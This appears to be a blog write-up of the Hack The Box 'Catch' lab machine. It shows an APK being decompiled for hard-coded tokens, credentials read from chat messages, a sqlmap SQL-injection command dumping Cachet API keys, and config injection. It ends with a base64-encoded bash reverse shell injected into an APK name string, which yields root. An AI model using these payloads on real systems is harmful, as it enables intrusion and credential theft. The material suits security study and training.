---
layout: post
title: "HTB Catch"
tags:
    - CTF
    - HTB
---

## osint

Starting with an Nmap scan revealed a number of services running on the target.

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?    syn-ack
5000/tcp open  upnp?   syn-ack
```

Interestingly, there were two different Apache services, both on different versions, as well as another two ports that were not identified.

Cookies fetched by an Nmap script showed that there was a Gitea server running on port 3000. But the other ports were still unknown.

```
Set-Cookie: i_like_gitea=a9634c3d8acdc09d; Path=/; HttpOnly
```

Opening each of the pages in a web browser helped to identify these other services.

The main page on port 80 was a simple landing page for 'Catch Global Systems', allowing the user to download an APK file. This would have to be further investigated.

Port 3000 was running Gitea version 1.14.1 with Go 1.16.3 and port 5000 was running [Let's Chat](https://github.com/sdelements/lets-chat). Both of these were locked with passwords and default credentials did not work.

The last page of interest was a monitoring dashboard running on port 8000 which appeared to be based on Cachet 2.4. Some background research found a few different CVEs which could be useful however they all required an authenticated user and would not be useable at this point.


## reverse-engineering

Going back to the APK that was found, Apktool can be used to decompile the binary so that the source code can be browsed in another application such as VSCode.

```bash
apktool d ./catchv1.0.apk
```

According to the landing page that was found earlier, "The future enhancements [include] Lets-chat/Gitea integration", hinting that there could be API keys or hard-coded credentials in the application to integrate these services.

Tokens Found

original/res/values/strings.xml

```
<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>

<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>

<string name="slack_token">xoxp-23984754863-2348975623103</string>
```

Use Let’s Chat API Token to read channels and messages

```bash
curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms
curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
```

```bash
[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}]
[{"id":"61b8732cfe190b466d476c02","text":"ah sure!","posted":"2021-12-14T10:34:20.749Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b8731ffe190b466d476c01","text":"You should actually include this task to your list as well as a part of quarterly audit","posted":"2021-12-14T10:34:07.449Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b872b9fe190b466d476c00","text":"Also make sure we've our systems, applications and databases up-to-date.","posted":"2021-12-14T10:32:25.514Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b87282fe190b466d476bff","text":"Excellent! ","posted":"2021-12-14T10:31:30.403Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b87277fe190b466d476bfe","text":"Why not. We've this in our todo list for next quarter","posted":"2021-12-14T10:31:19.094Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b87241fe190b466d476bfd","text":"@john is it possible to add SSL to our status domain to make sure everything is secure ? ","posted":"2021-12-14T10:30:25.108Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b8702dfe190b466d476bfa","text":"Here are the credentials `john :  E}V!mywu_69T4C}W`","posted":"2021-12-14T10:21:33.859Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},{"id":"61b87010fe190b466d476bf9","text":"Sure one sec.","posted":"2021-12-14T10:21:04.635Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},{"id":"61b86fb1fe190b466d476bf8","text":"Can you create an account for me ? ","posted":"2021-12-14T10:19:29.677Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b86f4dfe190b466d476bf6","text":"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ","posted":"2021-12-14T10:17:49.761Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"}]
```

And grab list of users

```bash
[{"id":"61b86aead984e2451036eb16","firstName":"Administrator","lastName":"NA","username":"admin","displayName":"Admin","avatar":"e2b5310ec47bba317c5f1b5889e96f04","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18","61b8708efe190b466d476bfb"]},{"id":"61b86dbdfe190b466d476bf0","firstName":"John","lastName":"Smith","username":"john","displayName":"John","avatar":"f5504305b704452bba9c94e228f271c4","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},{"id":"61b86e40fe190b466d476bf2","firstName":"Will","lastName":"Robinson","username":"will","displayName":"Will","avatar":"7c6143461e935a67981cc292e53c58fc","openRooms":["61b86b3fd984e2451036eb18","61b86b28d984e2451036eb17"]},{"id":"61b86f15fe190b466d476bf5","firstName":"Lucas","lastName":"NA","username":"lucas","displayName":"Lucas","avatar":"b36396794553376673623dc0f6dec9bb","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18"]}]
```

Found credentials for the status domain

```bash
"Here are the credentials `john :  E}V!mywu_69T4C}W`"
```

Use SQL Injection with sqlmap to dump api keys

```bash
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbms=mysql -D cachet -T users -C api_key,username --dump

+----------------------+----------+
| api_key              | username |
+----------------------+----------+
| 7GVCqTY5abrox48Nct8j | john     |
| rMSN8kJN9TPADl2cWv8N | admin    |
+----------------------+----------+
```

[https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/)

Configuration Injection in Settings > Mail > ‘Mail From Address’

${DB_USERNAME} = will

${DB_PASSWORD} = s2#4Fg0_%3!

SSH as will

```bash
User Flag: 794e64d1eb9b77178f53792d5a0b60e8
```

Modify and recompile APK file with reverse shell shellcode

```bash
Strings.xml
<string name="app_name">Catch; echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuOTgvOTAwMSAwPCYxIDI+JjEK | base64 -d | bash -i</string>
```

Upload to server which will run it as a cronjob and give privilege escalation

```bash
nc -lvp 9001
scp out.apk will@10.10.11.150:/opt/mdm/apk_bin/
```

```bash
listening on [any] 9001 ...
connect to [10.10.14.98] from status.catch.htb [10.10.11.150] 36122

> id
uid=0(root) gid=0(root) groups=0(root)
> ls
Catch
lets-chat
mdm
reset.sh
root.txt
run.sh
```